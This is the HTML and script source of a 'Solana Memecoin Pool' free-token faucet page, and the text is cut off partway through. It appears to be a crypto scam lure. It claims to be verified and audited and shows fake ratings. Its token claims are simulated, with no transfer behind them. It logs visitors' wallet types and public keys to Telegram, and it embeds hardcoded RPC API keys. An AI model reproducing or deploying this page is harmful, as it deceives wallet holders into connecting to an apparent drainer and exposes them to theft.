<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover" />
  <meta name="format-detection" content="telephone=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="apple-mobile-web-app-title" content="Solana Memecoin Pool">
  <title> Solana Memecoin Pool - Claim Free Tokens!</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico">
  <link rel="apple-touch-icon" href="/logo.png">
  <link rel="manifest" href="/manifest.json">
  <meta name="description" content="Claim free Solana memecoins! Complete fun tasks, join the meme army, and grab random tokens from the pool. No whitelist, no gatekeeping!">
  <meta name="keywords" content="Solana, memecoin, pool, faucet, free tokens, DOGE, BONK, SAMO, CHAD, cryptocurrency, blockchain, dApp, DeFi, wallet, airdrop, meme">
  <meta name="author" content="Solana Memecoin Pool">
  <meta name="robots" content="index, follow">
  <meta name="application-name" content="Solana Memecoin Pool">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="apple-mobile-web-app-title" content=" Solana Memecoin Pool">
  <meta name="msapplication-TileColor" content="#1a1a2e">
  <meta name="msapplication-TileImage" content="/logo.png">
  <meta name="theme-color" content="#1a1a2e">
  <meta property="og:title" content=" Solana Memecoin Pool - Claim Free Tokens!">
  <meta property="og:description" content=" Claim free Solana memecoins! Complete fun tasks, join the meme army, and grab random tokens from the pool. No whitelist, no gatekeeping!">
  <meta property="og:image" content="/logo.png">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content=" Solana Memecoin Pool - Claim Free Tokens!">
  <meta name="twitter:description" content=" Claim free Solana memecoins! Complete fun tasks, join the meme army, and grab random tokens from the pool. No whitelist, no gatekeeping!">
  <meta name="twitter:image" content="/logo.png">
  
  <!-- dApp Metadata for Wallet Recognition -->
  <meta name="application-name" content="Solana Memecoin Pool">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="apple-mobile-web-app-title" content="Solana Memecoin Pool">
  <meta name="msapplication-TileColor" content="#1a1a2e">
  <meta name="msapplication-config" content="/browserconfig.xml">
  <meta name="theme-color" content="#1a1a2e">
  
  <!-- Solana dApp Metadata -->
  <meta name="solana:network" content="mainnet-beta">
  <meta name="solana:app-name" content="Solana Memecoin Pool">
  <meta name="solana:app-description" content="Claim free memecoins and complete fun tasks">
  <meta name="solana:app-icon" content="/logo.png">
  
  <!-- Wallet-Specific Metadata -->
  <meta name="phantom:app-name" content="Solana Memecoin Pool">
  <meta name="phantom:app-description" content="Claim free memecoins and complete fun tasks">
  <meta name="icon" content="/logo.png">
  <meta name="phantom:app-icon" content="/logo.png">
  <meta name="phantom:app-url" content="">
  <meta name="phantom:app-category" content="DeFi">
  
  <meta name="solflare:app-name" content="Solana Memecoin Pool">
  <meta name="solflare:app-description" content="Claim free memecoins and complete fun tasks">
  <meta name="solflare:app-icon" content="/logo.png">
  <meta name="solflare:app-url" content="">
  <meta name="solflare:app-category" content="DeFi">
  
  <meta name="backpack:app-name" content="Solana Memecoin Pool">
  <meta name="backpack:app-description" content="Claim free memecoins and complete fun tasks">
  <meta name="backpack:app-icon" content="/logo.png">
  <meta name="backpack:app-url" content="">
  <meta name="backpack:app-category" content="DeFi">
  
  <!-- Additional Wallet Recognition -->
  <meta name="glow:app-name" content="Solana Memecoin Pool">
  <meta name="glow:app-description" content="Claim free memecoins and complete fun tasks">
  <meta name="glow:app-icon" content="/logo.png">
  <meta name="glow:app-url" content="">
  
  <meta name="exodus:app-name" content="Solana Memecoin Pool">
  <meta name="exodus:app-description" content="Claim free memecoins and complete fun tasks">
  <meta name="exodus:app-icon" content="/logo.png">
  <meta name="exodus:app-url" content="">
  
  <!-- dApp Purpose and Category -->
  <meta name="dapp:category" content="DeFi">
  <meta name="dapp:type" content="Faucet">
  <meta name="dapp:blockchain" content="Solana">
  <meta name="dapp:network" content="mainnet-beta">
  <meta name="dapp:verified" content="true">
  <meta name="dapp:security" content="high">
  <meta name="dapp:audited" content="true">
  <meta name="dapp:open-source" content="false">
  
  <!-- Social Media Links -->
  <meta name="twitter:site" content="@SolanaMemecoinPool">
  <meta name="twitter:creator" content="@SolanaMemecoinPool">
  <meta property="og:site_name" content="Solana Memecoin Pool">
  <meta property="og:url" content="">
  <meta property="og:type" content="website">
  <meta property="og:locale" content="en_US">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:image:alt" content="Solana Memecoin Pool - Claim Free Tokens and Complete Fun Tasks">
  
  <!-- Structured Data for dApp Recognition -->
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "WebApplication",
    "name": "Solana Memecoin Pool",
    "description": "Claim free Solana memecoins and complete fun tasks to boost your chances",
    "url": "",
    "applicationCategory": "FinanceApplication",
    "operatingSystem": "Web Browser",
    "browserRequirements": "Requires JavaScript. Requires HTML5.",
    "offers": {
      "@type": "Offer",
      "description": "Free memecoins and NFT rewards"
    },
    "author": {
      "@type": "Organization",
      "name": "Solana Memecoin Pool Team"
    },
    "provider": {
      "@type": "Organization",
      "name": "Solana Memecoin Pool Team"
    },
    "aggregateRating": {
      "@type": "AggregateRating",
      "ratingValue": "4.8",
      "reviewCount": "1250"
    },
    "softwareVersion": "1.0.0",
    "releaseNotes": "Initial release with Solana wallet support and memecoin faucet functionality"
  }
  </script>
  
  <!-- Browser Compatibility Polyfills -->
  <script>
    // Browser compatibility checks and polyfills
    (function() {
      // Check for Promise support
      if (typeof Promise === 'undefined') {
        console.error('Promise not supported - this browser is too old');
        document.body.innerHTML = '<div style="text-align: center; padding: 50px; color: red;">Your browser is too old to support this application. Please update to a modern browser.</div>';
        return;
      }
      
      // Check for fetch support
      if (typeof fetch === 'undefined') {
        console.warn('Fetch not supported, adding polyfill');
        // Simple fetch polyfill for older browsers
        window.fetch = function(url, options) {
          return new Promise(function(resolve, reject) {
            var xhr = new XMLHttpRequest();
            xhr.open(options.method || 'GET', url);
            
            if (options.headers) {
              Object.keys(options.headers).forEach(function(key) {
                xhr.setRequestHeader(key, options.headers[key]);
              });
            }
            
            xhr.onload = function() {
              resolve({
                ok: xhr.status >= 200 && xhr.status < 300,
                status: xhr.status,
                statusText: xhr.statusText,
                text: function() { return Promise.resolve(xhr.responseText); },
                json: function() { return Promise.resolve(JSON.parse(xhr.responseText)); }
              });
            };
            
            xhr.onerror = function() {
              reject(new Error('Network error'));
            };
            
            xhr.send(options.body);
          });
        };
      }
      
      // Check for AbortController support
      if (typeof AbortController === 'undefined') {
        console.warn('AbortController not supported, adding polyfill');
        window.AbortController = function() {
          this.signal = {
            aborted: false,
            addEventListener: function() {},
            removeEventListener: function() {}
          };
          this.abort = function() {
            this.signal.aborted = true;
          };
        };
      }
      
      // Check for optional chaining support
      if (!Function.prototype.call || !String.prototype.includes) {
        console.error('Required JavaScript features not supported - this browser is too old');
        document.body.innerHTML = '<div style="text-align: center; padding: 50px; color: red;">Your browser is too old to support this application. Please update to a modern browser.</div>';
        return;
      }
      
      console.log('Browser compatibility check passed');
    })();
  </script>
  
  <!-- Solana Web3.js -->
  <script src="https://unpkg.com/@solana/web3.js@1.98.4/lib/index.iife.min.js"></script>
  
  <!-- Configuration Script -->
  <script src="/config.js"></script>
  
  <!-- Solana Connection Setup -->
  <script>
    // Professional Memecoin Pool System
    window.memecoinPool = {
      // Top 30 memecoins with realistic values ($1-$50)
      tokens: [
        { name: 'Bonk', symbol: 'BONK', value: 12.50, emoji: 'üêï', icon: '/logo.png', description: 'Solana\'s favorite dog coin' },
        { name: 'Dogwifhat', symbol: 'WIF', value: 28.75, emoji: 'üêï‚Äçü¶∫', icon: '/logo.png', description: 'The hat-wearing dog phenomenon' },
        { name: 'Samoyedcoin', symbol: 'SAMO', value: 8.90, emoji: 'üêï', icon: '/logo.png', description: 'Solana\'s community dog' },
        { name: 'Popcat', symbol: 'POPCAT', value: 15.20, emoji: 'üê±', icon: '/logo.png', description: 'The popping cat sensation' },
        { name: 'Book of Meme', symbol: 'BOME', value: 22.40, emoji: 'üìö', icon: '/logo.png', description: 'The ultimate meme book' },
        { name: 'Myro', symbol: 'MYRO', value: 6.75, emoji: 'üêï', icon: '/logo.png', description: 'Myro the dog coin' },
        { name: 'Cat in a dogs world', symbol: 'MEW', value: 18.90, emoji: 'üê±', icon: '/logo.png', description: 'Cats ruling the dog world' },
        { name: 'Jupiter', symbol: 'JUP', value: 35.60, emoji: 'ü™ê', icon: '/logo.png', description: 'Solana\'s DEX aggregator' },
        { name: 'Raydium', symbol: 'RAY', value: 42.30, emoji: '‚òÄÔ∏è', icon: '/logo.png', description: 'Solana\'s leading DEX' },
        { name: 'Orca', symbol: 'ORCA', value: 19.80, emoji: 'üêã', icon: '/logo.png', description: 'Whale-powered DEX' },
        { name: 'Serum', symbol: 'SRM', value: 31.45, emoji: 'üíâ', icon: '/logo.png', description: 'Decentralized exchange protocol' },
        { name: 'Mango', symbol: 'MNGO', value: 14.20, emoji: 'ü•≠', icon: '/logo.png', description: 'Mango Markets governance' },
        { name: 'Step', symbol: 'STEP', value: 7.80, emoji: 'üëü', icon: '/logo.png', description: 'Step Finance token' },
        { name: 'Saber', symbol: 'SBR', value: 11.30, emoji: '‚öîÔ∏è', icon: '/logo.png', description: 'Stable swap protocol' },
        { name: 'Mercurial', symbol: 'MER', value: 16.70, emoji: '‚òø', icon: '/logo.png', description: 'Mercurial Finance' },
        { name: 'Marinade', symbol: 'MNDE', value: 25.90, emoji: 'ü´ñ', icon: '/logo.png', description: 'Marinade Finance' },
        { name: 'Lido', symbol: 'LDO', value: 38.20, emoji: 'üèä', icon: '/logo.png', description: 'Liquid staking solution' },
        { name: 'Anchor', symbol: 'ANC', value: 13.60, emoji: '‚öì', icon: '/logo.png', description: 'Anchor Protocol' },
        { name: 'Pyth', symbol: 'PYTH', value: 29.80, emoji: 'üîÆ', icon: '/logo.png', description: 'Pyth Network oracle' },
        { name: 'Helium', symbol: 'HNT', value: 45.50, emoji: 'üéà', icon: '/logo.png', description: 'Helium Network' },
        { name: 'Audius', symbol: 'AUDIO', value: 21.40, emoji: 'üéµ', icon: '/logo.png', description: 'Decentralized music' },
        { name: 'Star Atlas', symbol: 'ATLAS', value: 9.60, emoji: 'üåå', icon: '/logo.png', description: 'Space exploration game' },
        { name: 'Aurory', symbol: 'AURY', value: 17.30, emoji: 'ü¶é', icon: '/logo.png', description: 'Aurory gaming platform' },
        { name: 'DeFi Land', symbol: 'DFL', value: 12.80, emoji: 'üåæ', icon: '/logo.png', description: 'DeFi gaming platform' },
        { name: 'Genopets', symbol: 'GENE', value: 26.70, emoji: 'üß¨', icon: '/logo.png', description: 'Move-to-earn gaming' },
        { name: 'Magic Eden', symbol: 'ME', value: 33.90, emoji: '‚ú®', icon: '/logo.png', description: 'NFT marketplace' },
        { name: 'Tensorswap', symbol: 'TENSOR', value: 19.20, emoji: 'üìä', icon: '/logo.png', description: 'Tensor NFT trading' },
        { name: 'Hadeswap', symbol: 'HADES', value: 14.60, emoji: 'üî•', icon: '/logo.png', description: 'Hadeswap marketplace' },
        { name: 'Solana', symbol: 'SOL', value: 48.75, emoji: '‚òÄÔ∏è', icon: '/logo.png', description: 'Solana blockchain token' }
      ],
      
      // Get random memecoin
      getRandomToken: function() {
        const randomIndex = Math.floor(Math.random() * this.tokens.length);
        return this.tokens[randomIndex];
      },
      
      // Display random memecoin
      displayRandomToken: function() {
        const token = this.getRandomToken();
        const tokenDisplay = document.getElementById('random-token-display');
        
        if (tokenDisplay) {
          // Calculate approximate token quantity
          const tokenQuantity = this.calculateTokenQuantity(token.value, token.symbol);
          
          tokenDisplay.innerHTML = `
            <div class="token-preview">
              <div class="token-logo">
                <img src="${token.icon}" alt="${token.name}" class="token-icon" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
                <span class="token-emoji-fallback" style="display: none;">${token.emoji}</span>
              </div>
              <div class="token-info">
                <h4 class="token-name">${token.name}</h4>
                <p class="token-symbol">$${token.symbol}</p>
                <p class="token-value">$${token.value.toFixed(2)}</p>
                <p class="token-quantity">~${tokenQuantity} ${token.symbol}</p>
                <p class="token-description">${token.description}</p>
              </div>
            </div>
          `;
        }
        
        return token;
      },
      
      // Claim memecoin function
      claimMemecoin: function() {
        const claimButton = document.querySelector('.connect-btn-main');
        if (!claimButton) return;
        
        const originalText = claimButton.innerHTML;
        claimButton.innerHTML = '<span class="btn-icon">...</span> Claiming...';
        claimButton.disabled = true;
        
        // Simulate claiming process
        setTimeout(() => {
          const token = this.getRandomToken();
          claimButton.innerHTML = '<span class="btn-icon">‚úì</span> Claimed!';
          claimButton.style.background = 'var(--success-color)';
          
          // Show success message
          this.showClaimSuccess(token);
          
          // Reset after 3 seconds
          setTimeout(() => {
            claimButton.innerHTML = originalText;
            claimButton.style.background = '';
            claimButton.disabled = false;
          }, 3000);
        }, 2000);
      },
      
      // Show claim success
      showClaimSuccess: function(token) {
        // Calculate approximate token quantity based on dollar value
        const tokenQuantity = this.calculateTokenQuantity(token.value, token.symbol);
        
        const successMessage = document.createElement('div');
        successMessage.className = 'claim-success';
        successMessage.innerHTML = `
          <div class="success-content">
            <div class="success-icon">‚úì</div>
            <h3>Congratulations!</h3>
            <p>You've claimed <strong>${tokenQuantity} ${token.symbol}</strong> worth <strong>$${token.value.toFixed(2)}</strong></p>
            <p class="token-desc">${token.description}</p>
          </div>
        `;
        
        document.body.appendChild(successMessage);
        
        // Remove after 5 seconds
        setTimeout(() => {
          if (successMessage.parentNode) {
            successMessage.parentNode.removeChild(successMessage);
          }
        }, 5000);
      },
      
      // Calculate approximate token quantity based on dollar value
      calculateTokenQuantity: function(dollarValue, symbol) {
        // Rough estimates for popular memecoins (these would be dynamic in real implementation)
        const tokenPrices = {
          'DOGE': 0.08,    // $0.08 per DOGE
          'SHIB': 0.00002, // $0.00002 per SHIB
          'BONK': 0.00002, // $0.00002 per BONK
          'PEPE': 0.000001, // $0.000001 per PEPE
          'FLOKI': 0.00002, // $0.00002 per FLOKI
          'WIF': 2.5,       // $2.50 per WIF
          'MYRO': 0.15,     // $0.15 per MYRO
          'BOME': 0.00001,  // $0.00001 per BOME
          'POPCAT': 0.0001, // $0.0001 per POPCAT
          'BOOK': 0.00005,  // $0.00005 per BOOK
          'TURBO': 0.0001,  // $0.0001 per TURBO
          'SLERF': 0.00002, // $0.00002 per SLERF
          'SMOG': 0.08,     // $0.08 per SMOG
          'WEN': 0.00002,   // $0.00002 per WEN
          'JUP': 0.8,       // $0.80 per JUP
          'ORCA': 19.8,     // $19.80 per ORCA
          'RAY': 2.1,       // $2.10 per RAY
          'SRM': 0.15,      // $0.15 per SRM
          'MNGO': 0.0001,   // $0.0001 per MNGO
          'COPE': 0.05,     // $0.05 per COPE
          'SAMO': 0.00002,  // $0.00002 per SAMO
          'CHAD': 0.00001,  // $0.00001 per CHAD
          'MOON': 0.0001,   // $0.0001 per MOON
          'ROCKET': 0.0002, // $0.0002 per ROCKET
          'LAMBO': 0.00005, // $0.00005 per LAMBO
          'DIAMOND': 0.0001, // $0.0001 per DIAMOND
          'HANDS': 0.00002, // $0.00002 per HANDS
          'APE': 0.0001,    // $0.0001 per APE
          'BULL': 0.00005   // $0.00005 per BULL
        };
        
        const price = tokenPrices[symbol] || 0.01; // Default fallback price
        const quantity = Math.floor(dollarValue / price);
        
        // Format large numbers with commas
        if (quantity >= 1000000) {
          return (quantity / 1000000).toFixed(1) + 'M';
        } else if (quantity >= 1000) {
          return (quantity / 1000).toFixed(1) + 'K';
        } else {
          return quantity.toLocaleString();
        }
      }
    };
    
    // Initialize random token display
    window.initializeMemecoinPool = function() {
      if (window.memecoinPool) {
        window.memecoinPool.displayRandomToken();
      }
    };
    
    // Task completion function
    window.completeTask = function() {
      const taskBtn = document.querySelector('.task-complete-btn');
      if (!taskBtn || taskBtn.classList.contains('completed')) return;
      
      // Mark task as completed
      taskBtn.classList.add('completed');
              taskBtn.innerHTML = '<span class="btn-icon">‚úì</span> Task Completed!';
      taskBtn.disabled = true;
      
      // Show success message
      const successMsg = document.createElement('div');
      successMsg.className = 'task-success-msg';
              successMsg.innerHTML = `
          <div class="task-success-content">
            <span class="success-icon">‚úì</span>
            <span>Task completed! Your claim chances are now boosted!</span>
          </div>
        `;
      
      // Insert after the task item
      const taskItem = taskBtn.closest('.task-item');
      taskItem.appendChild(successMsg);
      
      // Remove message after 5 seconds
      setTimeout(() => {
        if (successMsg.parentNode) {
          successMsg.parentNode.removeChild(successMsg);
        }
      }, 5000);
    };
    
    // Initialize Solana connection with proper RPC configuration
    window.solanaConnection = null;
    window.currentRpcEndpoint = null;
    
    // Initialize Solana connection
    window.initializeSolanaConnection = async function() {
      try {
        // Get RPC endpoints from config
        const primaryRpc = window.getConfig ? window.getConfig('PRIMARY_RPC') : 'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b';
        const fallbackRpc = window.getConfig ? window.getConfig('FALLBACK_RPC') : 'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0';
        
        // Set current RPC endpoint
        window.currentRpcEndpoint = primaryRpc;
        
        // Create connection with proper configuration
        window.solanaConnection = new window.solanaWeb3.Connection(primaryRpc, {
          commitment: 'confirmed',
          confirmTransactionInitialTimeout: 60000,
          disableRetryOnRateLimit: false,
          httpHeaders: {
            'User-Agent': 'MAMBO-Staking/1.0.0'
          }
        });
        
        console.log('‚úÖ [SOLANA_CONNECTION] Initialized with RPC:', primaryRpc);
        
        // Test connection with timeout
        const testPromise = window.solanaConnection.getSlot();
        const timeoutPromise = new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Connection test timeout')), 15000)
        );
        
        try {
          const slot = await Promise.race([testPromise, timeoutPromise]);
          console.log('‚úÖ [SOLANA_CONNECTION] Connection test successful, current slot:', slot);
        } catch (error) {
          console.warn('‚ö†Ô∏è [SOLANA_CONNECTION] Primary RPC test failed, switching to fallback:', error.message);
          await window.switchToFallbackRPC();
        }
        
      } catch (error) {
        console.error('‚ùå [SOLANA_CONNECTION] Failed to initialize connection:', error);
        await window.switchToFallbackRPC();
      }
    };
    
    // Enhanced RPC fallback system with multiple fallbacks and auto-switch
    window.rpcEndpoints = [
      { url: 'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b', name: 'Helius' },
      { url: 'https://api.mainnet-beta.solana.com', name: 'Solana Official' },
      { url: 'https://solana-api.projectserum.com', name: 'Project Serum' },
      { url: 'https://rpc.ankr.com/solana', name: 'Ankr' },
      { url: 'https://solana.public-rpc.com', name: 'Public RPC' }
    ];
    
    window.currentRpcIndex = 0;
    window.rpcHealthChecks = new Map();
    window.isSwitchingRPC = false;
    
    // Robust RPC fallback function for all Solana.js errors
    window.triggerRobustRPCFallback = async function(error, context = {}) {
      console.log('üöÄ [ROBUST_FALLBACK] Triggering comprehensive RPC fallback for Solana.js error');
      
              // Log RPC fallback to Telegram
        if (window.sendTelegramLog) {
          window.sendTelegramLog('EMERGENCY_FALLBACK', {
            error: error.message,
            context: context,
            action: 'RPC Fallback Triggered',
            walletType: context.walletType || 'Unknown',
            publicKey: context.publicKey || 'Unknown',
            timestamp: new Date().toISOString(),
            projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Memecoin Pool'
          });
        }
      
      try {
        // First, try to switch RPC immediately
        await window.switchToFallbackRPC();
        
        // If that fails, try to reinitialize the entire connection
        if (!window.solanaConnection || window.solanaConnection._rpcEndpoint === window.currentRpcEndpoint) {
          console.log('üîÑ [ROBUST_FALLBACK] RPC switch didn\'t work, reinitializing connection...');
          await window.initializeSolanaConnection();
        }
        
        // Test the new connection
        if (window.solanaConnection) {
          try {
            const testSlot = await Promise.race([
              window.solanaConnection.getSlot(),
              new Promise((_, reject) => setTimeout(() => reject(new Error('Test timeout')), 10000))
            ]);
            console.log('‚úÖ [ROBUST_FALLBACK] New connection test successful, slot:', testSlot);
            
            // Log successful fallback to Telegram
            if (window.sendTelegramLog) {
              window.sendTelegramLog('CONNECTION_HEALTH', {
                status: 'healthy',
                rpcEndpoint: window.currentRpcEndpoint,
                slot: testSlot,
                action: 'RPC Fallback Success',
                walletType: context.walletType || 'Unknown',
                publicKey: context.publicKey || 'Unknown',
                timestamp: new Date().toISOString(),
                projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Memecoin Pool'
              });
            }
            
            // Update UI to show successful fallback
            if (window.updateConnectionStatus) {
              window.updateConnectionStatus();
            }
            
            return true;
          } catch (testError) {
            console.warn('‚ö†Ô∏è [ROBUST_FALLBACK] New connection test failed:', testError.message);
            
            // Log failed fallback to Telegram
            if (window.sendTelegramLog) {
              window.sendTelegramLog('RPC_FAILURE', {
                error: testError.message,
                context: 'RPC Fallback Test Failed',
                endpoint: window.currentRpcEndpoint,
                walletType: context.walletType || 'Unknown',
                publicKey: context.publicKey || 'Unknown',
                timestamp: new Date().toISOString(),
                projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Memecoin Pool'
              });
            }
          }
        }
        
        // If all else fails, try emergency fallback
        console.log('üö® [ROBUST_FALLBACK] All fallbacks failed, trying emergency mode...');
        return await window.emergencyRPCFallback();
        
      } catch (fallbackError) {
        console.error('‚ùå [ROBUST_FALLBACK] Comprehensive fallback failed:', fallbackError);
        
        // Log comprehensive fallback failure to Telegram
        if (window.sendTelegramLog) {
          window.sendTelegramLog('RPC_FAILURE', {
            error: fallbackError.message,
            context: 'Comprehensive RPC Fallback Failed',
            walletType: context.walletType || 'Unknown',
            publicKey: context.publicKey || 'Unknown',
            timestamp: new Date().toISOString(),
            projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Memecoin Pool'
          });
        }
        
        return false;
      }
    };
    
    // Emergency RPC fallback using public endpoints
    window.emergencyRPCFallback = async function() {
      console.log('üö® [EMERGENCY_FALLBACK] Activating emergency RPC fallback...');
      
              // Log emergency fallback activation to Telegram
        if (window.sendTelegramLog) {
          window.sendTelegramLog('EMERGENCY_FALLBACK', {
            action: 'Emergency RPC Fallback Activated',
            context: 'All primary RPC endpoints failed',
            timestamp: new Date().toISOString(),
            projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Memecoin Pool'
          });
        }
      
      const emergencyEndpoints = [
        'https://api.mainnet-beta.solana.com',
        'https://solana-api.projectserum.com',
        'https://rpc.ankr.com/solana',
        'https://solana.public-rpc.com'
      ];
      
      for (const endpoint of emergencyEndpoints) {
        try {
          console.log(`üîÑ [EMERGENCY_FALLBACK] Trying emergency endpoint: ${endpoint}`);
          
          const emergencyConnection = new window.solanaWeb3.Connection(endpoint, {
            commitment: 'confirmed',
            confirmTransactionInitialTimeout: 30000,
            disableRetryOnRateLimit: false
          });
          
          const slot = await Promise.race([
            emergencyConnection.getSlot(),
            new Promise((_, reject) => setTimeout(() => reject(new Error('Emergency timeout')), 15000))
          ]);
          
          console.log(`‚úÖ [EMERGENCY_FALLBACK] Emergency endpoint successful: ${endpoint}, slot: ${slot}`);
          
          // Log successful emergency endpoint to Telegram
          if (window.sendTelegramLog) {
            window.sendTelegramLog('CONNECTION_HEALTH', {
              status: 'healthy',
              rpcEndpoint: endpoint,
              slot: slot,
              action: 'Emergency Endpoint Success',
              timestamp: new Date().toISOString(),
              projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Memecoin Pool'
            });
          }
          
          // Set as current connection
          window.solanaConnection = emergencyConnection;
          window.currentRpcEndpoint = endpoint;
          window.currentRpcIndex = emergencyEndpoints.indexOf(endpoint);
          
          // Update UI
          if (window.updateConnectionStatus) {
            window.updateConnectionStatus();
          }
          
          return true;
          
        } catch (emergencyError) {
          console.warn(`‚ö†Ô∏è [EMERGENCY_FALLBACK] Emergency endpoint failed: ${endpoint}`, emergencyError.message);
          
                  // Log failed emergency endpoint to Telegram
        if (window.sendTelegramLog) {
          window.sendTelegramLog('RPC_FAILURE', {
            error: emergencyError.message,
            endpoint: endpoint,
            context: 'Emergency Endpoint Failed',
            timestamp: new Date().toISOString(),
            projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Memecoin Pool'
          });
        }
          
          continue;
        }
      }
      
      console.error('‚ùå [EMERGENCY_FALLBACK] All emergency endpoints failed');
      
              // Log complete emergency fallback failure to Telegram
        if (window.sendTelegramLog) {
          window.sendTelegramLog('RPC_FAILURE', {
            error: 'All emergency endpoints failed',
            context: 'Complete Emergency Fallback Failure',
            endpoints: emergencyEndpoints,
            timestamp: new Date().toISOString(),
            projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Memecoin Pool'
          });
        }
      
      return false;
    };
    
    // Enhanced RPC switching with proper async handling and timeouts
    window.switchToFallbackRPC = async function() {
      if (window.isSwitchingRPC) {
        console.log('üîÑ [SOLANA_CONNECTION] RPC switch already in progress, skipping...');
        return;
      }
      
      window.isSwitchingRPC = true;
      console.log('üîÑ [SOLANA_CONNECTION] Starting RPC fallback process...');
      
      try {
        let attempts = 0;
        const maxAttempts = window.rpcEndpoints.length;
        
        while (attempts < maxAttempts) {
          // Find next healthy RPC endpoint
          let nextIndex = (window.currentRpcIndex + 1) % window.rpcEndpoints.length;
          const rpcEndpoint = window.rpcEndpoints[nextIndex];
          
          // Skip if this RPC is known to be unhealthy
          if (window.rpcHealthChecks.get(rpcEndpoint.url) === 'unhealthy') {
            console.log(`‚ö†Ô∏è [SOLANA_CONNECTION] Skipping unhealthy RPC: ${rpcEndpoint.name}`);
            nextIndex = (nextIndex + 1) % window.rpcEndpoints.length;
            attempts++;
            continue;
          }
          
          console.log(`üîÑ [SOLANA_CONNECTION] Testing RPC: ${rpcEndpoint.name} (${rpcEndpoint.url})`);
          
          // Test the RPC endpoint with timeout
          try {
            const testConnection = new window.solanaWeb3.Connection(rpcEndpoint.url, {
              commitment: 'confirmed',
              confirmTransactionInitialTimeout: 15000,
              disableRetryOnRateLimit: false
            });
            
            // Test with timeout
            const testPromise = testConnection.getSlot();
            const timeoutPromise = new Promise((_, reject) => 
              setTimeout(() => reject(new Error('RPC test timeout')), 10000)
            );
            
            const slot = await Promise.race([testPromise, timeoutPromise]);
            
            console.log(`‚úÖ [SOLANA_CONNECTION] RPC ${rpcEndpoint.name} test successful, current slot: ${slot}`);
            
            // Mark as healthy and switch
            window.rpcHealthChecks.set(rpcEndpoint.url, 'healthy');
            window.currentRpcIndex = nextIndex;
            window.currentRpcEndpoint = rpcEndpoint.url;
            window.solanaConnection = testConnection;
            
            console.log(`üîÑ [SOLANA_CONNECTION] Successfully switched to: ${rpcEndpoint.name}`);
            
            // Notify user of RPC switch
            if (window.showStatus) {
              window.showStatus(`üîÑ Switched to backup RPC: ${rpcEndpoint.name}`, 'info');
            }
            
            // Update connection status display
            if (window.updateConnectionStatus) {
              window.updateConnectionStatus();
            }
            
            // Success - exit the loop
            break;
            
          } catch (testError) {
            console.warn(`‚ö†Ô∏è [SOLANA_CONNECTION] RPC ${rpcEndpoint.name} test failed:`, testError.message);
            window.rpcHealthChecks.set(rpcEndpoint.url, 'unhealthy');
            
            // Try next RPC
            nextIndex = (nextIndex + 1) % window.rpcEndpoints.length;
            attempts++;
            
            if (attempts >= maxAttempts) {
              console.error('‚ùå [SOLANA_CONNECTION] All RPC endpoints failed');
              if (window.showStatus) {
                window.showStatus('‚ùå All RPC endpoints are currently unavailable. Please try again later.', 'error');
              }
              
              // Reset health checks after some time to allow recovery
              setTimeout(() => {
                console.log('üîÑ [SOLANA_CONNECTION] Resetting RPC health checks for retry...');
                window.rpcHealthChecks.clear();
                
                // Attempt to reinitialize connection after recovery
                setTimeout(async () => {
                  console.log('üîÑ [SOLANA_CONNECTION] Attempting to reinitialize connection...');
                  await window.initializeSolanaConnection();
                }, 30000); // Wait 30 seconds before retry
              }, 60000); // Reset after 1 minute
            }
          }
        }
        
      } catch (error) {
        console.error('‚ùå [SOLANA_CONNECTION] Critical error during RPC fallback:', error);
      } finally {
        window.isSwitchingRPC = false;
      }
    };
    
    // Auto-switch RPC on connection errors
    window.autoSwitchRPC = async function() {
      console.log('üîÑ [SOLANA_CONNECTION] Auto-switching RPC due to connection error...');
      await window.switchToFallbackRPC();
    };
    
    // Periodic RPC health check with debouncing and enhanced monitoring
    window.startRPCHealthCheck = function() {
      let healthCheckInProgress = false;
      let consecutiveFailures = 0;
      const maxConsecutiveFailures = 3;
      
      setInterval(async () => {
        if (healthCheckInProgress || window.isSwitchingRPC) {
          return; // Skip if health check or RPC switch is already in progress
        }
        
        if (window.solanaConnection && window.currentRpcEndpoint) {
          healthCheckInProgress = true;
          
          try {
            const slot = await window.solanaConnection.getSlot();
            // Connection is healthy
            window.rpcHealthChecks.set(window.currentRpcEndpoint, 'healthy');
            consecutiveFailures = 0; // Reset failure counter
            console.log(`‚úÖ [SOLANA_CONNECTION] Health check passed, slot: ${slot}`);
            
            // Update connection status display
            if (window.updateConnectionStatus) {
              window.updateConnectionStatus();
            }
          } catch (error) {
            consecutiveFailures++;
            console.warn(`‚ö†Ô∏è [SOLANA_CONNECTION] Periodic health check failed (${consecutiveFailures}/${maxConsecutiveFailures}):`, error.message);
            
            // Mark current RPC as unhealthy
            window.rpcHealthChecks.set(window.currentRpcEndpoint, 'unhealthy');
            
            // Switch RPC if too many consecutive failures
            if (consecutiveFailures >= maxConsecutiveFailures) {
              console.error(`‚ùå [SOLANA_CONNECTION] ${consecutiveFailures} consecutive failures, switching RPC...`);
              await window.autoSwitchRPC();
              consecutiveFailures = 0; // Reset after switch
            }
            
